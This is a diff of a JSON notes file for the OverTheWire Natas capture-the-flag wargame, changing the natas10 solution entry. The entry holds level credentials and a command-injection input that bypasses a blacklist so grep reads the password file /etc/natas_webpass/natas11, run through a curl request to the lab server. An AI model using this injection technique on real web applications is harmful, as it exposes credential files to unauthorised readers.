@@ -52,6 +52,6 @@
     "natas10": {
         "password_to_next_level": "VUMQDmuITOEHzhviLE5V0VG9cPMQkyxd",
         "lesson": "Even if some commands have been blacklisted there are still other commands that will solve the challenge by bypassing those whitelisted commands",
-        "commands": ".* /etc/natas_webpass/natas11"
+        "commands": "curl -v -u natas10:EgjlkzB6E8LJyf2Obt4q7q4ewt5ZWSNv http://natas10.natas.labs.overthewire.org/   .* /etc/natas_webpass/natas11"
     }
 }
